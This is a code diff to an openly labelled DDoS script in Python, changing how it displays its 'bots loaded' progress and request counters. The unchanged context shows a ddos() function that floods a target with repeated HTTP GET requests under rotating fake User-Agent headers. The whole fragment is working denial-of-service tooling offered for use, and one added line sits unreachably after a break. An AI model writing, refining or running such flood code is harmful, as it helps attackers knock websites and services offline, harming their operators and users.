@@ -42,16 +42,17 @@ while True:
     except:
         print("[+] Invalid Input.")
 bot_count = 1
-for agent in useragents:
+while True:
+    bot_count += 1
     os.system('cls')
     print("[+] Readying DDoS Attack........")
     print("")
-    print(f"[+] {bot_count} Bots loaded.")
-    bot_count += random.randint(5, 10)
-    if bot_count >= (len(useragents)-1):
+    print(f"[+] {bot_count}% of Bots loaded.")
+    if bot_count >= 100:
         break
-sent = 0
-prevcount = 0
+        print("[+] Ready for attack.")
+sent = 1
+prevcount = 1
 def ddos():
     global sent
     global prevcount
@@ -61,8 +62,7 @@ def ddos():
         try:
             headers = {"User-Agent": bot}
             response = requests.get(ip, headers=headers)
-            os.system('cls')
-            print(f'[+] Server Response: {response} Sent: {sent}')
+            print(f'[+] Server Response: {response} Requests Sent: {sent}')
             response.close()
             sent += 1
             time.sleep(inthreadcooldown)
